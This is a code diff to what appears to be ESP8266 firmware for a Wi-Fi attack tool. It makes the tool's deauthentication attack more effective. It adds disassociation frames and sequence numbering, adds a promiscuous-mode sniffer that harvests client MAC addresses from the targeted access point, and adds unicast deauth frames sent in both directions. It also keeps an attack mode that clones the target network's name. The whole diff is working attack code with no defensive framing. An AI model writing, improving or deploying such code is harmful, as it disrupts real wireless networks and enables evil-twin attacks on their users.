@@ -41,8 +41,7 @@ static uint8_t deauthPkt[26] = {                     /* MACs filled later   */
     0xC0, 0x00,                  0x00, 0x00,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,                  0x07, 0x00
+    0x00, 0x00,                  0x02, 0x00 // Reason code 2
 };
 
 /* ------ cached scan ------------------------------------------------ */
@@ -52,6 +51,10 @@ static char     apBSSID[MAX_SCAN][18];   /* "XX:XX:XX:XX:XX:XX"         */
 static int      apCh[MAX_SCAN];
 static int      apRSSI[MAX_SCAN];
 static unsigned long lastDeauthMs;
+
+/* ------ client tracking for unicast deauth ------------------------- */
+static uint8_t  sniffedClients[3][6];
+static int      sniffedCount = 0;
 
 /* ================================================================== */
 /*  Hex helpers – avoids %X / %x portability traps on newlib-nano      */
@@ -288,12 +291,51 @@ static void doScan(void)
 /* ================================================================== */
 /*  Deauth                                                             */
 /* ================================================================== */
+static uint16_t deauthSeq = 0;
+
 static void sendDeauthBurst(void)
 {
-    for (int i = 0; i < 8; i++) {
-        deauthPkt[22] = (uint8_t)(i & 0x0F);
-        wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
-        if (i < 7) delayMicroseconds(500);
+    uint8_t frameTypes[] = {0xC0, 0xA0}; /* 0xC0=Deauth, 0xA0=Disassoc */
+    
+    /* 1. Broadcast Deauth/Disassoc */
+    for (int t = 0; t < 2; t++) {
+        deauthPkt[0] = frameTypes[t];
+        for (int i = 0; i < 3; i++) {
+            deauthSeq++;
+            deauthPkt[22] = (deauthSeq << 4) & 0xF0;
+            deauthPkt[23] = (deauthSeq >> 4) & 0xFF;
+            wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
+            delayMicroseconds(500);
+        }
+    }
+    
+    /* 2. Unicast Deauth/Disassoc to discovered clients */
+    for (int c = 0; c < sniffedCount; c++) {
+        uint8_t uPkt[26];
+        memcpy(uPkt, deauthPkt, 26);
+        
+        for (int t = 0; t < 2; t++) {
+            uPkt[0] = frameTypes[t];
+            
+            /* AP -> Client */
+            memcpy(&uPkt[4], sniffedClients[c], 6); // Dest = Client
+            memcpy(&uPkt[10], targetBSSID, 6);      // Src = AP
+            memcpy(&uPkt[16], targetBSSID, 6);      // BSSID = AP
+            deauthSeq++;
+            uPkt[22] = (deauthSeq << 4) & 0xF0;
+            uPkt[23] = (deauthSeq >> 4) & 0xFF;
+            wifi_send_pkt_freedom(uPkt, 26, 0);
+            delayMicroseconds(500);
+            
+            /* Client -> AP */
+            memcpy(&uPkt[4], targetBSSID, 6);       // Dest = AP
+            memcpy(&uPkt[10], sniffedClients[c], 6); // Src = Client
+            deauthSeq++;
+            uPkt[22] = (deauthSeq << 4) & 0xF0;
+            uPkt[23] = (deauthSeq >> 4) & 0xFF;
+            wifi_send_pkt_freedom(uPkt, 26, 0);
+            delayMicroseconds(500);
+        }
     }
 }
 
@@ -704,7 +746,28 @@ static void enterAttackMode(void)
     WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
     WiFi.softAP(targetSSID, NULL, targetChannel);
 
-    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {});
+    sniffedCount = 0; // reset active clients
+    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
+        if (!attacking || len < 28) return;
+        
+        /* Check if packet is Data frame or QoS Data to/from our AP */
+        bool fromAP = (memcmp(&buf[10], targetBSSID, 6) == 0);
+        bool toAP   = (memcmp(&buf[4],  targetBSSID, 6) == 0);
+        
+        if (fromAP || toAP) {
+            uint8_t *clientMac = fromAP ? &buf[4] : &buf[10];
+            if (clientMac[0] & 0x01) return; // skip broadcast/multicast
+            
+            for (int i = 0; i < sniffedCount; i++) {
+                if (memcmp(sniffedClients[i], clientMac, 6) == 0) return;
+            }
+            if (sniffedCount < 3) {
+                memcpy(sniffedClients[sniffedCount++], clientMac, 6);
+            } else {
+                memcpy(sniffedClients[millis() % 3], clientMac, 6);
+            }
+        }
+    });
     wifi_promiscuous_enable(1);
     wifi_set_channel(targetChannel);
 
